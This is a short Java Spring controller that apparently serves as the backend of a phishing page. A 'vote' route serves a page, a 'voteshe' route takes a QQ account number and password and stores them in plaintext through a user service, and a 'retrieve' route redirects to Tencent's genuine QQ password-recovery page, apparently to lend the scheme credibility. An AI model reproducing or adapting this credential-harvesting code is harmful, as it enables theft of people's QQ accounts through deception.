package com.yanhom.controller;

import java.util.List;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;

import com.yanhom.entity.User;
import com.yanhom.service.UserService;


@Controller
@RequestMapping("/")
public class LoginController {

	@Autowired
	public UserService us=null;
	@RequestMapping(value="vote")
	public String aboutMe(Model m)
	{
		return "index";
	}
	
	@RequestMapping(value="voteshe")
	public String vote(String qq,String pass)
	{
		User u=new User();
		u.setQq(qq);
		u.setPass(pass);
		us.add(u);
		return "success";
	}
	@RequestMapping(value="retrieve ")
	public String retrieve()
	{
		return "redirect:https://aq.qq.com/cn2/findpsw/pc/pc_find_pwd_input_account?source_id=1035";
	}
}
